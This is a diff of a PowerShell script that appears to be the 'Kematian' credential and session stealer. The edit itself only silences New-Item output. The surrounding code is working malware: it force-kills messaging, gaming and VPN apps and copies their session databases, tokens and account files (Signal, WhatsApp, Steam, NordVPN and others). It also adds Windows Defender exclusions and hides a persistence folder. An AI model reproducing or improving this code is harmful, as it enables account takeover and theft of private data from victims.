@@ -121,7 +121,7 @@ function Backup-Data {
 
     $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $filezilla_bkp)
     $folders | ForEach-Object {
-        New-Item -ItemType Directory -Path $_ -Force
+        New-Item -ItemType Directory -Path $_ -Force | Out-Null
     }
 
     #bulk data (added build ID with banner)
@@ -307,7 +307,7 @@ function Backup-Data {
         if (!(Test-Path $elementfolder)) { return }
         try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
         $element_session = "$folder_messaging\Element"
-        New-Item -ItemType Directory -Force -Path $element_session
+        New-Item -ItemType Directory -Force -Path $element_session | Out-Null
         Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force 
         Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force 
         Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force 
@@ -323,7 +323,7 @@ function Backup-Data {
         if (!(Test-Path $icqfolder)) { return }
         try { if (Get-Process $processname -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname  | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         $icq_session = "$folder_messaging\ICQ"
-        New-Item -ItemType Directory -Force -Path $icq_session 
+        New-Item -ItemType Directory -Force -Path $icq_session | Out-Null
         Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force 
     }
 
@@ -335,7 +335,7 @@ function Backup-Data {
         if (!(Test-Path $signalfolder)) { return }
         try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
         $signal_session = "$folder_messaging\Signal"
-        New-Item -ItemType Directory -Force -Path $signal_session
+        New-Item -ItemType Directory -Force -Path $signal_session | Out-Null
         Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
         Copy-Item -Path "$signalfolder\Local Storage" -Destination $signal_session -Recurse -force
         Copy-Item -Path "$signalfolder\Session Storage" -Destination $signal_session -Recurse -force
@@ -351,7 +351,7 @@ function Backup-Data {
         if (!(Test-Path $viberfolder)) { return }
         try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
         $viber_session = "$folder_messaging\Viber"
-        New-Item -ItemType Directory -Force -Path $viber_session
+        New-Item -ItemType Directory -Force -Path $viber_session | Out-Null
         $configfiles = @("config$1")
         foreach ($file in $configfiles) {
             Get-ChildItem -path $viberfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $viber_session }
@@ -378,7 +378,7 @@ function Backup-Data {
         $processname = "whatsapp"
         try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
         $whatsapp_session = "$folder_messaging\Whatsapp"
-        New-Item -ItemType Directory -Force -Path $whatsapp_session
+        New-Item -ItemType Directory -Force -Path $whatsapp_session | Out-Null
         $regexPattern = "WhatsAppDesktop"
         $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
         if ($parentFolder) {
@@ -396,7 +396,7 @@ function Backup-Data {
         if (!(Test-Path $skypefolder)) { return }
         try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
         $skype_session = "$folder_messaging\Skype"
-        New-Item -ItemType Directory -Force -Path $skype_session
+        New-Item -ItemType Directory -Force -Path $skype_session | Out-Null
         Copy-Item -Path "$skypefolder\Local Storage" -Destination $skype_session -Recurse -force
     }
 	
@@ -404,7 +404,7 @@ function Backup-Data {
         $pidgin_folder = "$env:userprofile\AppData\Roaming\.purple"
         if (!(Test-Path $pidgin_folder)) { return }
         $pidgin_accounts = "$folder_messaging\Pidgin"
-        New-Item -ItemType Directory -Force -Path $pidgin_accounts
+        New-Item -ItemType Directory -Force -Path $pidgin_accounts | Out-Null
         Copy-Item -Path "$pidgin_folder\accounts.xml" -Destination $pidgin_accounts -Recurse -force 
     }
 
@@ -416,7 +416,7 @@ function Backup-Data {
         if (!(Test-Path $steamfolder)) { return }
         try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
         $steam_session = "$folder_gaming\Steam"
-        New-Item -ItemType Directory -Force -Path $steam_session
+        New-Item -ItemType Directory -Force -Path $steam_session | Out-Null
         Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
         $ssfnfiles = @("ssfn$1")
         foreach ($file in $ssfnfiles) {
@@ -429,7 +429,7 @@ function Backup-Data {
     function minecraftstealer {
         $minecraft_session = "$folder_gaming\Minecraft"
         if (!(Test-Path $minecraft_session)) { return }
-        New-Item -ItemType Directory -Force -Path $minecraft_session
+        New-Item -ItemType Directory -Force -Path $minecraft_session | Out-Null
         $minecraftfolder1 = $env:appdata + "\.minecraft"
         $minecraftfolder2 = $env:userprofile + "\.lunarclient\settings\game"
         Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session 
@@ -443,7 +443,7 @@ function Backup-Data {
         if (!(Test-Path $epicgamesfolder)) { return }
         try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
         $epicgames_session = "$folder_gaming\EpicGames"
-        New-Item -ItemType Directory -Force -Path $epicgames_session
+        New-Item -ItemType Directory -Force -Path $epicgames_session | Out-Null
         Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
         Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
         Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
@@ -456,7 +456,7 @@ function Backup-Data {
         if (!(Test-Path $ubisoftfolder)) { return }
         try { if (Get-Process $processname -ErrorAction 'SilentlyContinue'-ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
         $ubisoft_session = "$folder_gaming\Ubisoft"
-        New-Item -ItemType Directory -Force -Path $ubisoft_session
+        New-Item -ItemType Directory -Force -Path $ubisoft_session | Out-Null
         Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
     }
 
@@ -468,7 +468,7 @@ function Backup-Data {
         $ea_session = "$folder_gaming\Electronic Arts"
         if (!(Test-Path $ea_session)) { return }
         try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
-        New-Item -ItemType Directory -Force -Path $ea_session
+        New-Item -ItemType Directory -Force -Path $ea_session | Out-Null
         Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
     }
 
@@ -479,7 +479,7 @@ function Backup-Data {
         if (!(Test-Path $growtopiafolder)) { return }
         $growtopia_session = "$folder_gaming\Growtopia"
         try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
-        New-Item -ItemType Directory -Force -Path $growtopia_session
+        New-Item -ItemType Directory -Force -Path $growtopia_session | Out-Null
         Copy-Item -Path "$growtopiafolder\save.dat" -Destination $growtopia_session -Recurse -force
     }
 
@@ -489,7 +489,7 @@ function Backup-Data {
         if (!(Test-Path $battle_folder)) { return }
         foreach ($process in $processnames) { Stop-Process -Name $process -ErrorAction 'SilentlyContinue' -Force }
         $battle_session = "$folder_gaming\Battle.net"
-        New-Item -ItemType Directory -Force -Path $battle_session
+        New-Item -ItemType Directory -Force -Path $battle_session | Out-Null
         $files = Get-ChildItem -Path $battle_folder -File -Recurse -Include "*.db", "*.config" 
         foreach ($file in $files) {
             Copy-Item -Path $file.FullName -Destination $battle_session
@@ -506,7 +506,7 @@ function Backup-Data {
         if (!(Test-Path $nordvpnfolder)) { return }
         try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
         $nordvpn_account = "$folder_vpn\NordVPN"
-        New-Item -ItemType Directory -Force -Path $nordvpn_account
+        New-Item -ItemType Directory -Force -Path $nordvpn_account | Out-Null
         $pattern = "^([A-Za-z]+\.exe_Path_[A-Za-z0-9]+)$"
         $directories = Get-ChildItem -Path $nordvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
         $files = Get-ChildItem -Path $nordvpnfolder -File | Where-Object { $_.Name -match $pattern }
@@ -530,7 +530,7 @@ function Backup-Data {
         if (!(Test-Path $protonvpnfolder)) { return }
         try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
         $protonvpn_account = "$folder_vpn\ProtonVPN"
-        New-Item -ItemType Directory -Force -Path $protonvpn_account
+        New-Item -ItemType Directory -Force -Path $protonvpn_account | Out-Null
         $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
         $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
         $files = Get-ChildItem -Path $protonvpnfolder -File | Where-Object { $_.Name -match $pattern }
@@ -553,7 +553,7 @@ function Backup-Data {
         if (!(Test-Path $surfsharkvpnfolder)) { return }
         try { (Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  ) } catch {} 
         $surfsharkvpn_account = "$folder_vpn\Surfshark"
-        New-Item -ItemType Directory -Force -Path $surfsharkvpn_account
+        New-Item -ItemType Directory -Force -Path $surfsharkvpn_account | Out-Null
         Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
     }
 	
@@ -561,7 +561,7 @@ function Backup-Data {
         $openvpnfolder = "$env:userprofile\AppData\Roaming\OpenVPN Connect"
         if (!(Test-Path $openvpnfolder)) { return }
         $openvpn_accounts = "$folder_vpn\OpenVPN"
-        New-Item -ItemType Directory -Force -Path $openvpn_accounts
+        New-Item -ItemType Directory -Force -Path $openvpn_accounts | Out-Null
         Copy-Item -Path "$openvpnfolder\profiles" -Destination $openvpn_accounts -Recurse -force 
     }
 
@@ -1108,7 +1108,7 @@ function Invoke-TASKS {
     if ($persistence) {
         Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
         Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
-        New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
+        New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force | Out-Null
         # Hidden Directory
         $KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
         $KDOT_DIR.attributes = "Hidden", "System"
